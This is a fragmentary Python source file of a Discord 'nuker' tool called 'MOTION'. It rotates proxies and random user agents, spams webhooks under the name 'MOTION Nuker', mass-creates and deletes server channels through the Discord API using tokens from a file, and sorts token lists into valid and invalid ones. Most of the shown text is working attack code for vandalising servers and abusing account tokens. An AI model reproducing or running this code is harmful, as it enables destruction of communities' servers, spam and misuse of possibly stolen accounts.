...
System.Clear()
System.Title("MOTION - By QUIPO")
lllll = ['proxies.txt', 'webhooks.txt', 'tokens.txt']
if not os.path.exists('./MOTION'):
    os.system('md MOTION')
    with open('./MOTION/useragents.txt', 'w') as file:
        ua = UserAgent()
        file.write('\n'.join([ua.random for _ in range(50)]))
elif os.path.exists('./MOTIONc') and not os.path.exists('./MOTION/useragents.txt'):
    with open('./MOTION/useragents.txt', 'w') as file:
        ua = UserAgent()
        file.write('\n'.join([ua.random for _ in range(50)]))
else:
...
def send_webhook(url=str, content=str, proxy=None):
    try:
        req.post(url=url,
                json={"content": content, "username": "MOTION Nuker", "avatar_url": "https://media.discordapp.net/attachments/1054650838129332255/1153307620187312168/convert.png?width=402&height=402"}
                ,proxies=proxy)
        print_success(url)
...
def random_useragent():
    with open('./MOTION/useragents.txt', 'r') as file:
            ...
            def create_channel(guild_id, name, type_):
                b = req.post(url=f"https://discord.com/api/guilds/{guild_id}/channels",
                        headers={
                            "User-Agent": random_useragent(),
                            "Authorization": tokens()[0],
                            "X-Audit-Log-Reason": "MOTION Nuker"
                        },
                        json={
                            "name": name,
            ...
            if r.status_code == 200:
                ...
                def delete(channel):
                    b = req.delete(url=f"https://discord.com/api/channels/{channel}",
                               headers={ "Authorization": tokens()[0],
                                        "X-Audit-Log-Reason": "By MOTION Nuker",
                                        "User-Agent": random_useragent()})
    ...
    if ch == '23':
        ...
        if len(tokens()) > 0:
            ...
            for token in tokens(): 
                ...
                yon = input_()
                if yon.lower().startswith('y'):
                    with open("./MOTION/valids.txt", 'w') as file:
                        file.write('\n'.join(valids))
                    with open("./MOTION/invalids.txt", "w") as file:
                        file.write('\n'.join(invalids))
                    print_("[!!] Saved In /MOTION, Press Enter to continue")
                    input()
                await tokenTools()
    if ch == '24':
        print_logo()
